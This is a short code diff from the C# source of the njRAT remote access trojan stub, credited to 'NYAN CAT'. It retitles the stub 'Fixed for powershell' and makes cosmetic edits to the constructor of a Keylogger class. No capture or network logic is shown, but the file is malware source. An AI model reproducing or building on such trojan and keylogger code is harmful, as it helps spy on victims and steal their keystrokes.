@@ -12,24 +12,23 @@ using Microsoft.Win32;
 namespace Lime
 {
 
+
     /*
      * │ Author       : NYAN CAT
-     * │ Name         : njRAT C# Stub
+     * │ Name         : njRAT C# Stub | Fixed for powershell
      * │ Contact      : https:github.com/NYAN-x-CAT
      * 
      * This program is distributed for educational purposes only.
      */
 
 
-
-
     public class Keylogger
     {
         public Keylogger()
         {
-            this.lastKey = Keys.None;
-            this.Logs = "";
-            this.vn = "[kl]";
+            lastKey = Keys.None;
+            Logs = "";
+            vn = "[kl]";
             keyboard = new Keyboard();
         }
 
